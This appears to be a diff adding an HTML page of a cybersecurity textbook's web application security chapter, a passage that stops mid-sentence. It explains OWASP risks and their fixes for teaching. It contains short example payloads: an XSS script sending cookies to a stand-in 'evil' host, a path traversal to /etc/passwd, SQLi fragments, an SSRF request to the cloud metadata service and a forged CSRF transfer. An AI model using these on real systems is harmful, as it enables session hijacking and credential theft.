@@ -1,0 +1,964 @@
+
+<!DOCTYPE html>
+
+
+<html lang="en" data-content_root="../../" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>10. Chapter 10: Web Application Security &#8212; Cybersecurity: Theory, Practice, and Ethics</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
+  </script>
+  <!--
+    this give us a css class that will be invisible only if js is disabled
+  -->
+  <noscript>
+    <style>
+      .pst-js-only { display: none !important; }
+
+    </style>
+  </noscript>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../_static/styles/theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+<link href="../../_static/styles/pydata-sphinx-theme.css?digest=8878045cc6db502f8baf" rel="stylesheet" />
+
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=03e43079" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/sphinx-book-theme.css?v=3c74b3bc" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css?v=9c3e77be" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css?v=76b2166b" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.11b39860a7a0cbfd473a3ad8a317855267ff0bd372690045ca344a6b62be495e.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css?v=4fa983c6" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-design.min.css?v=95c83b7e" />
+  
+  <!-- So that users can add custom icons -->
+  <script src="../../_static/scripts/fontawesome.js?digest=8878045cc6db502f8baf"></script>
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../_static/scripts/bootstrap.js?digest=8878045cc6db502f8baf" />
+<link rel="preload" as="script" href="../../_static/scripts/pydata-sphinx-theme.js?digest=8878045cc6db502f8baf" />
+
+    <script src="../../_static/documentation_options.js?v=9eb32ce0"></script>
+    <script src="../../_static/doctools.js?v=9a2dae69"></script>
+    <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../_static/clipboard.min.js?v=a7894cd8"></script>
+    <script src="../../_static/copybutton.js?v=f281be69"></script>
+    <script src="../../_static/scripts/sphinx-book-theme.js?v=fab101a9"></script>
+    <script>let toggleHintShow = 'Click to show';</script>
+    <script>let toggleHintHide = 'Click to hide';</script>
+    <script>let toggleOpenOnPrint = 'true';</script>
+    <script src="../../_static/togglebutton.js?v=b8b12719"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
+    <script src="../../_static/design-tabs.js?v=f930bc37"></script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
+    <script async="async" src="../../_static/sphinx-thebe.js?v=c100c467"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
+    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'chapters/10_web_security/chapter10';</script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="11. Chapter 11: Network Defense and Hardening" href="../11_network_defense/chapter11.html" />
+    <link rel="prev" title="9. Chapter 9: Exploitation and Post-Exploitation" href="../09_exploitation/chapter09.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="en"/>
+  <meta name="docsearch:version" content="" />
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Skip to main content</a></div>
+  
+  <div id="pst-scroll-pixel-helper"></div>
+  
+  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
+    <i class="fa-solid fa-arrow-up"></i>Back to top</button>
+
+  
+  <dialog id="pst-search-dialog">
+    
+<form class="bd-search d-flex align-items-center"
+      action="../../search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         placeholder="Search..."
+         aria-label="Search..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form>
+  </dialog>
+
+  <div class="pst-async-banner-revealer d-none">
+  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Version warning"></aside>
+</div>
+
+  
+    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
+    </header>
+  
+
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      
+      
+      <dialog id="pst-primary-sidebar-modal"></dialog>
+      <div id="pst-primary-sidebar" class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+
+  
+    
+  
+
+<a class="navbar-brand logo" href="../../intro.html">
+  
+  
+  
+  
+  
+  
+    <p class="title logo__title">Cybersecurity: Theory, Practice, and Ethics</p>
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+<button class="btn search-button-field search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+ <i class="fa-solid fa-magnifying-glass"></i>
+ <span class="search-button__default-text">Search</span>
+ <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
+</button></div>
+        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item navbar-nav active">
+        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Front Matter</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../00_preface/preface.html">Preface</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part I: Foundations of Cybersecurity</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../01_intro/chapter01.html">1. Chapter 1: Introduction to Cybersecurity</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../02_cryptography/chapter02.html">2. Chapter 2: Cryptography</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../03_networking/chapter03.html">3. Chapter 3: Networking Fundamentals for Security</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part II: Threats and the Human Element</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../04_social_engineering/chapter04.html">4. Chapter 4: Social Engineering and the Human Element</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../05_risk/chapter05.html">5. Chapter 5: Risk Management and Governance</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part III: Offensive Security</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../06_pentest_methodology/chapter06.html">6. Chapter 6: Penetration Testing Methodology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../07_recon/chapter07.html">7. Chapter 7: Reconnaissance and OSINT</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../08_scanning/chapter08.html">8. Chapter 8: Scanning and Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../09_exploitation/chapter09.html">9. Chapter 9: Exploitation and Post-Exploitation</a></li>
+<li class="toctree-l1 current active"><a class="current reference internal" href="#">10. Chapter 10: Web Application Security</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part IV: Defensive Security</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../11_network_defense/chapter11.html">11. Chapter 11: Network Defense and Hardening</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../12_idps/chapter12.html">12. Chapter 12: Intrusion Detection and Prevention Systems</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../13_forensics/chapter13.html">13. Chapter 13: Digital Forensics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../14_incident_response/chapter14.html">14. Chapter 14: Incident Response</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part V: Advanced and Emerging Topics</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../15_malware/chapter15.html">15. Chapter 15: Malware Analysis</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../16_ctf/chapter16.html">16. Chapter 16: Capture the Flag and Competitive Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../17_emerging/chapter17.html">17. Chapter 17: Emerging Threats and Future Challenges</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Part VI: Cybersecurity, Society, and Critical Infrastructure</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../18_privacy_law/chapter18.html">18. Chapter 18: Privacy, Law, and Information Governance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../19_governance_culture/chapter19.html">19. Chapter 19: Security Governance, Policy, and Culture</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../20_ics_ot/chapter20.html">20. Chapter 20: Industrial Control Systems and OT Security</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Appendices</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../appendix_a/appendix_a.html">Appendix A: Acronyms and Abbreviations</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../appendix_b/appendix_b.html">Appendix B: Common Ports and Protocols</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../appendix_c/appendix_c.html">Appendix C: Certification Mapping</a></li>
+</ul>
+
+    </div>
+</nav></div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+      <div class="sidebar-primary-item">
+<div id="ethical-ad-placement"
+      class="flat"
+      data-ea-publisher="readthedocs"
+      data-ea-type="readthedocs-sidebar"
+      data-ea-manual="true">
+</div></div>
+  </div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main" role="main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article d-print-none">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</button></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+<a href="https://github.com/devharsh/cybersec-textbook" target="_blank"
+   class="btn btn-sm btn-source-repository-button"
+   title="Source repository"
+   data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+
+</a>
+
+
+
+
+
+
+<div class="dropdown dropdown-download-buttons">
+  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
+    <i class="fas fa-download"></i>
+  </button>
+  <ul class="dropdown-menu">
+      
+      
+      
+      <li><a href="../../_sources/chapters/10_web_security/chapter10.ipynb" target="_blank"
+   class="btn btn-sm btn-download-source-button dropdown-item"
+   title="Download source file"
+   data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="btn__text-container">.ipynb</span>
+</a>
+</li>
+      
+      
+      
+      
+      <li>
+<button onclick="window.print()"
+  class="btn btn-sm btn-download-pdf-button dropdown-item"
+  title="Print to PDF"
+  data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="btn__text-container">.pdf</span>
+</button>
+</li>
+      
+  </ul>
+</div>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button pst-navbar-icon"
+  title="Fullscreen mode"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+
+<button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button pst-js-only" aria-label="Color mode" data-bs-title="Color mode"  data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <i class="theme-switch fa-solid fa-sun                fa-lg" data-mode="light" title="Light"></i>
+  <i class="theme-switch fa-solid fa-moon               fa-lg" data-mode="dark"  title="Dark"></i>
+  <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"  title="System Settings"></i>
+</button>
+
+
+<button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
+</button>
+<button class="sidebar-toggle secondary-toggle btn btn-sm pst-navbar-icon" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>Chapter 10: Web Application Security</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#learning-objectives">10.1. Learning Objectives</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#key-terms">10.2. Key Terms</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#the-owasp-top-10">10.3. The OWASP Top 10</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#broken-access-control">10.3.1. Broken Access Control</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#insecure-direct-object-references">10.3.1.1. Insecure Direct Object References</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#forced-browsing-and-path-traversal">10.3.1.2. Forced Browsing and Path Traversal</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#injection-attacks">10.4. Injection Attacks</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#sql-injection-in-depth">10.4.1. SQL Injection in Depth</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-based-sqli">10.4.1.1. Error-Based SQLi</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#union-based-sqli">10.4.1.2. Union-Based SQLi</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#blind-sqli">10.4.1.3. Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-scripting">10.4.2. Cross-Site Scripting</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#reflected-xss">10.4.2.1. Reflected XSS</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#stored-xss">10.4.2.2. Stored XSS</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dom-based-xss">10.4.2.3. DOM-Based XSS</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-request-forgery">10.4.3. Cross-Site Request Forgery</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#csrf-mitigations">10.4.3.1. CSRF Mitigations</a></li>
+</ul>
+</li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#server-side-request-forgery">10.4.4. Server-Side Request Forgery</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#authentication-and-session-management">10.5. Authentication and Session Management</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#broken-authentication">10.5.1. Broken Authentication</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#secure-password-storage">10.5.1.1. Secure Password Storage</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#session-management-best-practices">10.5.1.2. Session Management Best Practices</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#security-misconfigurations">10.6. Security Misconfigurations</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#security-headers">10.6.1. Security Headers</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#web-application-firewalls-and-their-limits">10.7. Web Application Firewalls and Their Limits</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#waf-bypass-techniques">10.7.1. WAF Bypass Techniques</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#why-this-matters">10.8. Why This Matters</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#news-in-focus">10.9. News in Focus</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#review-questions-mcq">10.10. Review Questions (MCQ)</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#lab-assignment">10.11. Lab Assignment</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#references">10.12. References</a></li>
+</ul>
+            </nav>
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article">
+                  
+  <section class="tex2jax_ignore mathjax_ignore" id="chapter-10-web-application-security">
+<h1><span class="section-number">10. </span>Chapter 10: Web Application Security<a class="headerlink" href="#chapter-10-web-application-security" title="Link to this heading">#</a></h1>
+<blockquote>
+<div><p>“The web is the largest attack surface in history, and every website is a potential entry point.”</p>
+</div></blockquote>
+<hr class="docutils" />
+<section id="learning-objectives">
+<h2><span class="section-number">10.1. </span>Learning Objectives<a class="headerlink" href="#learning-objectives" title="Link to this heading">#</a></h2>
+<p>After completing this chapter, you will be able to:</p>
+<ol class="arabic simple">
+<li><p>Explain the OWASP Top 10 vulnerability categories and the risk each represents.</p></li>
+<li><p>Identify and exploit SQL injection, XSS, and CSRF in a controlled lab environment.</p></li>
+<li><p>Explain broken authentication, insecure direct object references, and security misconfigurations.</p></li>
+<li><p>Describe how HTTPS, CSP, HSTS, and SameSite cookies mitigate web attacks.</p></li>
+<li><p>Test for injection vulnerabilities using manual and automated techniques.</p></li>
+<li><p>Explain server-side request forgery (SSRF) and its impact in cloud environments.</p></li>
+<li><p>Describe the role of a Web Application Firewall and its limitations.</p></li>
+<li><p>Apply secure coding principles to prevent injection, XSS, and broken auth.</p></li>
+</ol>
+</section>
+<section id="key-terms">
+<h2><span class="section-number">10.2. </span>Key Terms<a class="headerlink" href="#key-terms" title="Link to this heading">#</a></h2>
+<ul class="simple">
+<li><p><strong>OWASP</strong>: Open Web Application Security Project; produces the Top 10 vulnerability list.</p></li>
+<li><p><strong>SQL injection (SQLi)</strong>: injecting SQL code via user input to manipulate a database query.</p></li>
+<li><p><strong>XSS</strong>: Cross-Site Scripting; injecting malicious JavaScript into a page viewed by other users.</p></li>
+<li><p><strong>CSRF</strong>: Cross-Site Request Forgery; tricking a browser into sending an authenticated request.</p></li>
+<li><p><strong>SSRF</strong>: Server-Side Request Forgery; tricking a server into making requests on the attacker’s behalf.</p></li>
+<li><p><strong>IDOR</strong>: Insecure Direct Object Reference; accessing another user’s data by changing a reference.</p></li>
+<li><p><strong>Broken auth</strong>: failures in session management, credential storage, or MFA enforcement.</p></li>
+<li><p><strong>CSP</strong>: Content Security Policy; HTTP header restricting sources of executable content.</p></li>
+<li><p><strong>HSTS</strong>: HTTP Strict Transport Security; forces HTTPS-only connections.</p></li>
+<li><p><strong>WAF</strong>: Web Application Firewall; filters malicious HTTP requests.</p></li>
+<li><p><strong>Prepared statement</strong>: a parameterised query that separates data from SQL structure.</p></li>
+<li><p><strong>Same-origin policy</strong>: browser policy restricting how documents from one origin access another.</p></li>
+</ul>
+</section>
+<hr class="docutils" />
+<section id="the-owasp-top-10">
+<h2><span class="section-number">10.3. </span>The OWASP Top 10<a class="headerlink" href="#the-owasp-top-10" title="Link to this heading">#</a></h2>
+<p>The OWASP Top 10 <span class="bibtex-citation" id="id1">[<a class="reference internal" href="#id12" title="OWASP Foundation. Owasp top 10:2021. https://owasp.org/Top10/, 2021.">OWASPFoundation21</a>]</span> is the most widely cited reference for web application
+security risk. The 2021 edition groups vulnerabilities into risk categories based on incidence,
+exploitability, and impact. This chapter covers the most technically significant categories.</p>
+<section id="broken-access-control">
+<h3><span class="section-number">10.3.1. </span>Broken Access Control<a class="headerlink" href="#broken-access-control" title="Link to this heading">#</a></h3>
+<p>Broken access control is the top risk in OWASP 2021, reflecting how frequently authorisation is
+implemented incorrectly. The application authenticates the user but fails to verify whether that
+user is authorised to perform a specific action or access a specific resource.</p>
+<section id="insecure-direct-object-references">
+<h4><span class="section-number">10.3.1.1. </span>Insecure Direct Object References<a class="headerlink" href="#insecure-direct-object-references" title="Link to this heading">#</a></h4>
+<p>IDOR occurs when a resource identifier in a URL or parameter can be modified to access another
+user’s data without authorisation. If <code class="docutils literal notranslate"><span class="pre">GET</span> <span class="pre">/invoice?id=1234</span></code> returns a user’s invoice, changing
+the parameter to <code class="docutils literal notranslate"><span class="pre">id=1235</span></code> should not return another user’s invoice without verifying ownership.
+Horizontal privilege escalation (accessing peer data) is the most common form; vertical privilege
+escalation (accessing admin data) is the most severe.</p>
+</section>
+<section id="forced-browsing-and-path-traversal">
+<h4><span class="section-number">10.3.1.2. </span>Forced Browsing and Path Traversal<a class="headerlink" href="#forced-browsing-and-path-traversal" title="Link to this heading">#</a></h4>
+<p>Forced browsing accesses pages or resources that are not linked from the application but are not
+protected by access controls. Path traversal (<code class="docutils literal notranslate"><span class="pre">../../etc/passwd</span></code>) exploits insufficient sanitisation
+of file-path inputs to read arbitrary files on the server. A well-structured application uses
+canonical path validation and whitelists permitted directories.</p>
+</section>
+</section>
+</section>
+<hr class="docutils" />
+<section id="injection-attacks">
+<h2><span class="section-number">10.4. </span>Injection Attacks<a class="headerlink" href="#injection-attacks" title="Link to this heading">#</a></h2>
+<section id="sql-injection-in-depth">
+<h3><span class="section-number">10.4.1. </span>SQL Injection in Depth<a class="headerlink" href="#sql-injection-in-depth" title="Link to this heading">#</a></h3>
+<p>SQLi is caused by constructing SQL queries using string concatenation with user-supplied input.
+The canonical fix is parameterised queries (prepared statements), which separate the SQL structure
+from the data and make injection structurally impossible.</p>
+<section id="error-based-sqli">
+<h4><span class="section-number">10.4.1.1. </span>Error-Based SQLi<a class="headerlink" href="#error-based-sqli" title="Link to this heading">#</a></h4>
+<p>Error-based SQLi submits syntax that causes the database to return an error message containing
+internal information (table names, column names, version strings). Many production applications
+display database errors to users, providing free intelligence to attackers.</p>
+</section>
+<section id="union-based-sqli">
+<h4><span class="section-number">10.4.1.2. </span>Union-Based SQLi<a class="headerlink" href="#union-based-sqli" title="Link to this heading">#</a></h4>
+<p>A UNION SELECT appended to the original query extracts data from other tables. The attacker first
+determines the number of columns in the original query (by incrementing ORDER BY N until an error
+occurs), then constructs a UNION SELECT with matching column count to extract target data.</p>
+</section>
+<section id="blind-sqli">
+<h4><span class="section-number">10.4.1.3. </span>Blind SQLi<a class="headerlink" href="#blind-sqli" title="Link to this heading">#</a></h4>
+<p>Blind SQLi extracts data one bit at a time when the application provides no direct output. Boolean
+blind: <code class="docutils literal notranslate"><span class="pre">AND</span> <span class="pre">1=1</span> <span class="pre">vs</span> <span class="pre">AND</span> <span class="pre">1=2</span></code> produces different application responses, allowing inference. Time-based
+blind: <code class="docutils literal notranslate"><span class="pre">AND</span> <span class="pre">SLEEP(5)</span></code> causes a five-second delay if the condition is true, extractable even when
+the application shows identical pages for true and false.</p>
+</section>
+</section>
+<section id="cross-site-scripting">
+<h3><span class="section-number">10.4.2. </span>Cross-Site Scripting<a class="headerlink" href="#cross-site-scripting" title="Link to this heading">#</a></h3>
+<p>XSS injects malicious JavaScript into content served to other users’ browsers.</p>
+<section id="reflected-xss">
+<h4><span class="section-number">10.4.2.1. </span>Reflected XSS<a class="headerlink" href="#reflected-xss" title="Link to this heading">#</a></h4>
+<p>Reflected XSS occurs when user input is immediately echoed in the response without encoding. The
+attacker crafts a URL containing a payload (<code class="docutils literal notranslate"><span class="pre">&lt;script&gt;document.location='https://evil/?'</span> <span class="pre">+</span> <span class="pre">document.cookie&lt;/script&gt;</span></code>) and sends it to a victim. The victim’s browser executes the script in
+the context of the trusted site, stealing the session cookie.</p>
+</section>
+<section id="stored-xss">
+<h4><span class="section-number">10.4.2.2. </span>Stored XSS<a class="headerlink" href="#stored-xss" title="Link to this heading">#</a></h4>
+<p>Stored XSS persists the payload in the application’s database (a comment, a username, a profile
+field). Every user who views the infected page executes the script. Stored XSS is more dangerous
+because it does not require the attacker to send a crafted link; the payload runs automatically.</p>
+</section>
+<section id="dom-based-xss">
+<h4><span class="section-number">10.4.2.3. </span>DOM-Based XSS<a class="headerlink" href="#dom-based-xss" title="Link to this heading">#</a></h4>
+<p>DOM-based XSS occurs when client-side JavaScript writes attacker-controlled data to the DOM without
+sanitisation. The payload never reaches the server; it is injected and executed entirely in the
+browser. Classic sink functions: <code class="docutils literal notranslate"><span class="pre">innerHTML</span></code>, <code class="docutils literal notranslate"><span class="pre">eval()</span></code>, <code class="docutils literal notranslate"><span class="pre">document.write()</span></code>.</p>
+</section>
+</section>
+<section id="cross-site-request-forgery">
+<h3><span class="section-number">10.4.3. </span>Cross-Site Request Forgery<a class="headerlink" href="#cross-site-request-forgery" title="Link to this heading">#</a></h3>
+<p>CSRF tricks an authenticated user’s browser into sending a forged request to a target application.
+Because the browser automatically includes session cookies, the forged request appears legitimate.
+A hidden form on a malicious page that submits <code class="docutils literal notranslate"><span class="pre">POST</span> <span class="pre">/transfer?amount=1000&amp;to=attacker</span></code> to the
+banking site executes if the user is logged in and has no CSRF protection.</p>
+<section id="csrf-mitigations">
+<h4><span class="section-number">10.4.3.1. </span>CSRF Mitigations<a class="headerlink" href="#csrf-mitigations" title="Link to this heading">#</a></h4>
+<p>The primary mitigation is a synchroniser token: a secret value included in each form that the
+server validates before processing the request. The SameSite cookie attribute (Strict or Lax)
+prevents cookies from being sent with cross-origin requests, defeating CSRF for modern browsers.</p>
+</section>
+</section>
+<section id="server-side-request-forgery">
+<h3><span class="section-number">10.4.4. </span>Server-Side Request Forgery<a class="headerlink" href="#server-side-request-forgery" title="Link to this heading">#</a></h3>
+<p>SSRF causes the server to make HTTP requests on behalf of the attacker. If an application fetches
+a user-specified URL, an attacker can point it at <code class="docutils literal notranslate"><span class="pre">http://169.254.169.254/</span></code> (the AWS Instance
+Metadata Service) to extract IAM credentials, or at internal services (<code class="docutils literal notranslate"><span class="pre">http://localhost:8080/admin</span></code>)
+not accessible externally. SSRF is particularly severe in cloud environments where the metadata
+service exposes credentials for the host machine’s IAM role.</p>
+</section>
+</section>
+<hr class="docutils" />
+<section id="authentication-and-session-management">
+<h2><span class="section-number">10.5. </span>Authentication and Session Management<a class="headerlink" href="#authentication-and-session-management" title="Link to this heading">#</a></h2>
+<section id="broken-authentication">
+<h3><span class="section-number">10.5.1. </span>Broken Authentication<a class="headerlink" href="#broken-authentication" title="Link to this heading">#</a></h3>
+<p>Broken authentication encompasses: weak password policies, missing lockout after failed login
+attempts (enabling brute force), credential stuffing (automating breach-database credentials
+against the target), password reset flows that can be bypassed, and session tokens that are
+too short or predictable.</p>
+<section id="secure-password-storage">
+<h4><span class="section-number">10.5.1.1. </span>Secure Password Storage<a class="headerlink" href="#secure-password-storage" title="Link to this heading">#</a></h4>
+<p>Passwords must never be stored in plaintext or as simple hashes. Use an adaptive algorithm
+(bcrypt, Argon2id) with a sufficient cost factor. The National Institute of Standards and
+Technology SP 800-63B recommends Argon2id as the preferred algorithm for new systems.</p>
+</section>
+<section id="session-management-best-practices">
+<h4><span class="section-number">10.5.1.2. </span>Session Management Best Practices<a class="headerlink" href="#session-management-best-practices" title="Link to this heading">#</a></h4>
+<p>Session tokens must be generated with a cryptographically secure random number generator (CSPRNG),
+be at least 128 bits of entropy, be invalidated on logout, have an absolute timeout, and be
+transmitted only over HTTPS. The HttpOnly attribute prevents JavaScript access to session cookies;
